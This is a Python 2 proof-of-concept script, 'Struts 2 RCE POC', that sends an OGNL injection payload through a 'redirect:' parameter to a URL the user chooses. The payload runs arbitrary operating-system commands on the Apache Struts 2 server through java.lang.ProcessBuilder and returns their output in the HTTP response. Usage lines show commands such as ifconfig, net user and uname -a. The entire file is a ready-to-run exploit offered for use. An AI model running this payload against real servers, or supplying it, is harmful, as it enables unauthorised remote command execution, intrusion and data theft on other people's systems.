#coding:utf-8

__author__ = 'PeiZhihong'

import argparse
import requests


"""
python st2Rce2.py -u URL -c ifconfig
python st2Rce2.py -u URL -c net -p user
python st2Rce2.py -u URL -c uname -p ~a
"""

red = "\x1b[1;31m"
yellow = '\x1b[1;33m'
clear = "\x1b[0m"

def banner():
	print """
	%sStruts 2 RCE POC, Author: %s%s
	""" %(red, __author__, clear)

def st2Rce(url,cmd):
	data = "redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'"+cmd+"'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
	myString = url + "?" + data
	#查看攻击载荷是否正确拼接
	#print myString
	res = requests.get('%s' % myString,timeout=10)
	response = res.text.strip()
	print '%s%s%s' % (yellow,response,clear)

def st2Rce2(url,cmd,para,myConnector):
	data = "redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'"+cmd+myConnector+para+"'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
	myString = url + "?" + data
	#查看攻击载荷是否正确拼接
	#print myString
	res = requests.get('%s' % myString,timeout=10)
	response = res.text.strip()
	print '%s%s%s' % (yellow,response,clear)

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', help="WebSiteUrl", required=True)
	parser.add_argument('-c','--cmd', help="Command", required=True)
	parser.add_argument('-p', '--parameter', default=None, help="Paramter")
	args = parser.parse_args()
	
	if args.parameter is None:
		st2Rce(args.url,args.cmd)
	else:
		if args.parameter[0] == '~':
			myConnector = "','-"
			st2Rce2(args.url,args.cmd,args.parameter[1:],myConnector)
		else:
			myConnector = "','"
			st2Rce2(args.url,args.cmd,args.parameter,myConnector)

if __name__ == '__main__':
	main()
